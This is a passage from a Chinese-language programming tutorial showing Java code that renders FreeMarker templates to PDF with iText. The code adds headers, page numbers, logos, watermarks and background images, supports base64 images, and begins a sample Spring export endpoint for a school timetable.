class="hljs-comment">     * <span class="hljs-doctag">@param</span> stamper PdfStamper对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> reader  PdfReader对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> DocumentException</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPageNumbers</span><span class="hljs-params">(PdfStamper stamper, PdfReader reader, String headerText)</span> <span class="hljs-keyword">throws</span> DocumentException, IOException &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> reader.getNumberOfPages();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= total; i++) &#123;<br>            <span class="hljs-type">Rectangle</span> <span class="hljs-variable">pageRect</span> <span class="hljs-operator">=</span> reader.getPageSizeWithRotation(i);<br>            <span class="hljs-type">PdfContentByte</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> stamper.getOverContent(i);<br><br>            <span class="hljs-type">BaseFont</span> <span class="hljs-variable">baseFont</span> <span class="hljs-operator">=</span> BaseFont.createFont(<span class="hljs-string">&quot;/template/font/simsun.ttc,0&quot;</span>, BaseFont.IDENTITY_H, BaseFont.NOT_EMBEDDED);<br>            content.setFontAndSize(baseFont, <span class="hljs-number">20</span>);<br><br>            ColumnText.showTextAligned(content, Element.ALIGN_CENTER, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phrase</span>(headerText, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(baseFont, <span class="hljs-number">10</span>)),<br>                    pageRect.getWidth() / <span class="hljs-number">2</span>, pageRect.getTop() - <span class="hljs-number">20</span>, <span class="hljs-number">0</span>);<br><br>            ColumnText.showTextAligned(content, Element.ALIGN_CENTER, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phrase</span>(<span class="hljs-string">&quot;页码 &quot;</span> + i + <span class="hljs-string">&quot; / &quot;</span> + total, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(baseFont, <span class="hljs-number">10</span>)),<br>                    pageRect.getRight()-<span class="hljs-number">50</span>, pageRect.getBottom() + <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);<br><br>            ColumnText.showTextAligned(content, Element.ALIGN_CENTER, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phrase</span>(<span class="hljs-string">&quot;Copyright © 2023 HollowStars. All rights reserved.&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(baseFont, <span class="hljs-number">10</span>)),<br>                    (pageRect.getLeft() + pageRect.getRight()) / <span class="hljs-number">2</span>, pageRect.getBottom() + <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);<br><br>        &#125;<br>    &#125;<br><br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 添加图片logo</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> stamper   PdfStamper对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> reader    PdfReader对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> logoPath  图片路径</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> newWidth  图片大小宽度如 141</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> newHeight 图片大小高度如30</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> absoluteX 图片相对位置 如20</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> absoluteY 图片相对位置 如-30</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> DocumentException</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addLogoImg</span><span class="hljs-params">(PdfStamper stamper, PdfReader reader, String logoPath, <span class="hljs-type">float</span> newWidth, <span class="hljs-type">float</span> newHeight, <span class="hljs-type">float</span> absoluteX, <span class="hljs-type">float</span> absoluteY)</span> <span class="hljs-keyword">throws</span> DocumentException, IOException &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= reader.getNumberOfPages(); i++) &#123;<br>            <span class="hljs-type">Rectangle</span> <span class="hljs-variable">pageRect</span> <span class="hljs-operator">=</span> reader.getPageSizeWithRotation(i);<br>            <span class="hljs-type">PdfContentByte</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> stamper.getOverContent(i);<br><br>            <span class="hljs-type">BaseFont</span> <span class="hljs-variable">baseFont</span> <span class="hljs-operator">=</span> BaseFont.createFont(<span class="hljs-string">&quot;/template/font/simsun.ttc&quot;</span>, BaseFont.IDENTITY_H, BaseFont.NOT_EMBEDDED);<br>            content.setFontAndSize(baseFont, <span class="hljs-number">20</span>);<br><br>            <span class="hljs-comment">// 添加Logo图片到页眉</span><br>            <span class="hljs-type">Image</span> <span class="hljs-variable">logoImage</span> <span class="hljs-operator">=</span> Image.getInstance(logoPath);<br>            logoImage.scaleAbsolute(newWidth, newHeight);<br>            logoImage.setAbsolutePosition(pageRect.getLeft() + absoluteX, pageRect.getTop() + absoluteY);<br>            content.addImage(logoImage);<br><br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 添加水印图片</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> stamper       PdfStamper对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> reader        PdfReader对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> watermarkPath 水印图片路径</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> DocumentException</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addWatermarkImage</span><span class="hljs-params">(PdfStamper stamper, PdfReader reader, String watermarkPath)</span> <span class="hljs-keyword">throws</span> DocumentException, IOException &#123;<br>        <span class="hljs-type">Image</span> <span class="hljs-variable">watermarkImage</span> <span class="hljs-operator">=</span> Image.getInstance(watermarkPath);<br>        watermarkImage.scaleToFit(<span class="hljs-number">400</span>, <span class="hljs-number">400</span>); <span class="hljs-comment">// 调整水印图片大小</span><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * .scaleAbsolute    .scaleToFit 这两个方法 什么区别</span><br><span class="hljs-comment">         * scaleAbsolute和scaleToFit是iText库中用于缩放图像的两个方法。</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * scaleAbsolute(float width, float height):</span><br><span class="hljs-comment">         * 该方法用于将图像缩放到指定的绝对宽度和高度。</span><br><span class="hljs-comment">         * 参数width和height分别指定了缩放后的宽度和高度。</span><br><span class="hljs-comment">         * 图像将按照指定的宽度和高度进行缩放，可能会导致图像的比例失调。</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * scaleToFit(float width, float height):</span><br><span class="hljs-comment">         * 该方法用于将图像缩放以适应指定的矩形框的大小。</span><br><span class="hljs-comment">         * 参数width和height指定了矩形框的宽度和高度。</span><br><span class="hljs-comment">         * 图像将按照比例缩放，以适应指定的矩形框，同时保持其宽高比。</span><br><span class="hljs-comment">         * 简而言之，scaleAbsolute方法按照指定的宽度和高度进行缩放，而scaleToFit方法会按照比例缩放以适应指定的矩形框大小。选择使用哪个方法取决于你的需求和图像的要求。</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= reader.getNumberOfPages(); i++) &#123;<br>            <span class="hljs-type">Rectangle</span> <span class="hljs-variable">pageRect</span> <span class="hljs-operator">=</span> reader.getPageSizeWithRotation(i);<br>            <span class="hljs-type">PdfContentByte</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> stamper.getOverContent(i);<br><br>            <span class="hljs-comment">// 创建PdfGState对象并设置透明度</span><br>            <span class="hljs-type">PdfGState</span> <span class="hljs-variable">gState</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PdfGState</span>();<br>            gState.setFillOpacity(<span class="hljs-number">0.1f</span>); <span class="hljs-comment">// 水印图片透明度 (0.0f - 1.0f，0.0f 表示完全透明，1.0f 表示完全不透明)</span><br><br>            content.saveState();<br>            content.setGState(gState);<br><br>            <span class="hljs-comment">// 添加水印图片到页面</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> (pageRect.getLeft() + pageRect.getRight() - watermarkImage.getScaledWidth()) / <span class="hljs-number">2</span>;<br>            <span class="hljs-type">float</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> (pageRect.getBottom() + pageRect.getTop() - watermarkImage.getScaledHeight()) / <span class="hljs-number">2</span>;<br>            content.addImage(watermarkImage, watermarkImage.getScaledWidth(), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, watermarkImage.getScaledHeight(), x, y);<br><br>            content.restoreState();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addBackgroundImage</span><span class="hljs-params">(PdfStamper stamper, PdfReader reader, String bgImagePath)</span> <span class="hljs-keyword">throws</span> DocumentException, IOException &#123;<br>        <span class="hljs-type">Image</span> <span class="hljs-variable">backgroundImage</span> <span class="hljs-operator">=</span> Image.getInstance(bgImagePath);<br>        <span class="hljs-comment">/* 设置图片的位置 */</span><br>        backgroundImage.setAbsolutePosition(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">/* 设置图片的大小 */</span><br>        backgroundImage.scaleAbsolute(<span class="hljs-number">595</span>, <span class="hljs-number">842</span>);<br><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= reader.getNumberOfPages(); i++) &#123;<br>            <span class="hljs-type">Rectangle</span> <span class="hljs-variable">pageRect</span> <span class="hljs-operator">=</span> reader.getPageSizeWithRotation(i);<br>            <span class="hljs-type">PdfContentByte</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> stamper.getOverContent(i);<br><br>            <span class="hljs-comment">// 创建PdfGState对象并设置透明度</span><br>            <span class="hljs-type">PdfGState</span> <span class="hljs-variable">gState</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PdfGState</span>();<br>            gState.setFillOpacity(<span class="hljs-number">0.2f</span>);<br><br>            content.saveState();<br>            content.setGState(gState);<br><br>            <span class="hljs-comment">// 添加水印图片到页面</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> (pageRect.getLeft() + pageRect.getRight() - backgroundImage.getScaledWidth()) / <span class="hljs-number">2</span>;<br>            <span class="hljs-type">float</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> (pageRect.getBottom() + pageRect.getTop() - backgroundImage.getScaledHeight()) / <span class="hljs-number">2</span>;<br>            content.addImage(backgroundImage, backgroundImage.getScaledWidth(), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, backgroundImage.getScaledHeight(), x, y);<br><br>            content.restoreState();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>该工具类包含了<code>FreeMarker</code>渲染HTML、HTML转<code>PDF</code> 、<code>PDF</code>加工（添加页眉、页脚、水印、背景等）的方法。其中若HTML中<code>&lt;img&gt;</code>标签包含<code>base64</code>图片，需要添加额外<code>B64ImgReplacedElementFactory</code>支持：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> DunkingCurry</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">B64ImgReplacedElementFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ReplacedElementFactory</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 实现createReplacedElement 替换html中的Img标签</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> c 上下文</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> box 盒子</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> uac 回调</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cssWidth css宽</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cssHeight css高</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ReplacedElement</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ReplacedElement <span class="hljs-title function_">createReplacedElement</span><span class="hljs-params">(LayoutContext c, BlockBox box, UserAgentCallback uac,</span><br><span class="hljs-params">                                                 <span class="hljs-type">int</span> cssWidth, <span class="hljs-type">int</span> cssHeight)</span> &#123;<br>        <span class="hljs-type">Element</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> box.getElement();<br>        <span class="hljs-keyword">if</span> (e == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nodeName</span> <span class="hljs-operator">=</span> e.getNodeName();<br>        <span class="hljs-comment">// 找到img标签</span><br>        <span class="hljs-keyword">if</span> (nodeName.equals(<span class="hljs-string">&quot;img&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">attribute</span> <span class="hljs-operator">=</span> e.getAttribute(<span class="hljs-string">&quot;src&quot;</span>);<br>            FSImage fsImage;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 生成itext图像</span><br>                fsImage = buildImage(attribute, uac);<br>            &#125; <span class="hljs-keyword">catch</span> (BadElementException | IOException e1) &#123;<br>                fsImage = <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (fsImage != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 对图像进行缩放</span><br>                <span class="hljs-keyword">if</span> (cssWidth != -<span class="hljs-number">1</span> || cssHeight != -<span class="hljs-number">1</span>) &#123;<br>                    fsImage.scale(cssWidth, cssHeight);<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ITextImageElement</span>(fsImage);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将base64编码解码并生成itext图像</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> srcAttr 属性</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> uac 回调</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> FSImage</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException io异常</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> BadElementException BadElementException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">protected</span> FSImage <span class="hljs-title function_">buildImage</span><span class="hljs-params">(String srcAttr, UserAgentCallback uac)</span> <span class="hljs-keyword">throws</span> IOException,<br>            BadElementException &#123;<br>        FSImage fsImage;<br>        <span class="hljs-keyword">if</span> (srcAttr.startsWith(<span class="hljs-string">&quot;data:image/&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">b64encoded</span> <span class="hljs-operator">=</span> srcAttr.substring(srcAttr.indexOf(<span class="hljs-string">&quot;base64,&quot;</span>) + <span class="hljs-string">&quot;base64,&quot;</span>.length(),<br>                    srcAttr.length());<br>            <span class="hljs-comment">// 解码</span><br>            <span class="hljs-type">byte</span>[] decodedBytes = Base64.decode(b64encoded);<br><br>            fsImage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ITextFSImage</span>(Image.getInstance(decodedBytes));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            fsImage = uac.getImageResource(srcAttr).getImage();<br>        &#125;<br>        <span class="hljs-keyword">return</span> fsImage;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 实现remove</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> e 元素</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(Element e)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 实现reset</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reset</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 实现setFormSubmissionListener</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> formsubmissionlistener 监听</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFormSubmissionListener</span><span class="hljs-params">(FormSubmissionListener formsubmissionlistener)</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此外，封装按模板直接生成<code>PDF</code>的工具类 <code>PdfTemplateUtil</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> DunkingCurry</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PdfTemplateUtil</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ByteArrayOutputStream <span class="hljs-title function_">createPdfByItext</span><span class="hljs-params">(HashMap&lt;String, Object&gt; dataMap, String templateName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> HtmlToPDFUtil.render(templateName, dataMap);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> HtmlToPDFUtil.getPDFBase64ByHtml(html);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64O</span> <span class="hljs-operator">=</span> HtmlToPDFUtil.pdfAddWaterHeaderLogo(base64<br>                , <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;仅供内部参阅&quot;</span><br>                , <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;&quot;</span><br>                , <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">141</span>, <span class="hljs-number">30</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">30</span><br>                , <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;&quot;</span><br>                , <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;classpath:template/img/report-background.jpg&quot;</span><br>        );<br><br>        <span class="hljs-keyword">return</span> HtmlToPDFUtil.base64ToPDF(base64O);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四、完整调用示例"><a href="#四、完整调用示例" class="headerlink" title="四、完整调用示例"></a>四、完整调用示例</h1><h2 id="PDF导出接口示例"><a href="#PDF导出接口示例" class="headerlink" title="PDF导出接口示例"></a>PDF导出接口示例</h2><p>此处提供一个导出生成<code>PDF</code>的接口示例供参考：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">  * 模板PDF导出接口</span><br><span class="hljs-comment">  */</span><br><span class="hljs-meta">@ApiOperation(value = &quot;模板PDF导出接口&quot;, notes = &quot;模板PDF导出接口&quot;, httpMethod = &quot;GET&quot;, produces = &quot;application/octet-stream&quot;)</span><br><span class="hljs-meta">@GetMapping(value = &quot;/exportPdf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exportPdf</span><span class="hljs-params">(HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 模板中的数据，实际运用从数据库中查询</span><br><br>        SchoolTimeTable.<span class="hljs-type">WeekLesson</span> <span class="hljs-variable">eightAm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolTimeTable</span>.WeekLesson();<br>        eightAm.setMon(<span class="hljs-string">&quot;语文&quot;</span>);<br>        eightAm.setTue(<span class="hljs-string">&quot;数学&quot;</span>);<br>        eightAm.setWed(<span class="hljs-string">&quot;英语&quot;</span>);<br>        eightAm.setThu(<span class="hljs-string">&quot;化学&quot;</span>);<br>        eightAm.setFri(<span class="hljs-string">&quot;物理&quot;</span>);<br><br>        SchoolTimeTable.<span class="hljs-type">WeekLesson</span> <span class="hljs-variable">nineAm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolTimeTable</span>.WeekLesson();<br>        nineAm.setMon(<span class="hljs-string">&quot;数学&quot;</span>);<br>        nineAm.setTue(<span class="hljs-string">&quot;化学&quot;</span>);<br>        nineAm.setWed(<span class="hljs-string">&quot;语文&quot;</span>);<br>        nineAm.setThu(<span class="hljs-string">&quot;物理&quot;</span>);<br>        nineAm.setFri(<span class="hljs-string">&quot;英语&quot;</span>);<br><br>        SchoolTimeTable.<span class="hljs-type">WeekLesson</span> <span class="hljs-variable">tenAm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolTimeTable</span>.WeekLesson();<br>        tenAm.setMon(<span class="hljs-string">&quot;英语&quot;</span>);<br>        tenAm.setTue(<span class="hljs-string">&quot;生物&quot;</span>);<br>        tenAm.setWed(<span class="hljs-string">&quot;语文&quot;</span>);<br>        tenAm.setThu(<span class="hljs-string">&quot;历史&quot;</span>);<br>        tenAm.setFri(<span class="hljs-string">&quot;地理&quot;</span>);<br><br>        SchoolTimeTable.<span class="hljs-type">WeekLesson</span> <span class="hljs-variable">twoPm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolTimeTable</span>.WeekLesson();<br>        twoPm.setMon(<span class="hljs-string">&quot;物理&quot;</span>);<br>        twoPm.setTue(<span class="hljs-string">&quot;历史&quot;</span>);<br>        twoPm.setWed(<span class="hljs-string">&quot;数学&quot;</span>);<br>        twoPm.setThu(<span class="hljs-string">&quot;生物&quot;</span>);<br>        twoPm.setFri(<span class="hljs-string">&quot;英语&quot;</span>);<br><br>        SchoolTimeTable.<span class="hljs-type">WeekLesson</span> <span class="hljs-variable">threePm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolTimeTable</span>.WeekLesson();<br>        threePm.setMon(<span class="hljs-string">&quot;历史&quot;</span>);<br>        threePm.setTue(<span class="hljs-string">&quot;语文&quot;</span>);<br>        threePm.setWed(<span class="hljs-string">&quot;数学&quot;</span>);<br>        threePm.setThu(<span class="hljs-string">&quot;物理&quot;</span>);<br>        threePm.setFri(<span class="hljs-string">&quot;语文&quot;</span>);<br><br>        List&lt;SchoolTimeTable.WeekLesson&gt; weekLessons1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        weekLessons1.add(eightAm);<br>        weekLessons1.add(nineAm);<br>        weekLessons1.add(tenAm);<br><br>        List&lt;SchoolTimeTable.WeekLesson&gt; weekLessons2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        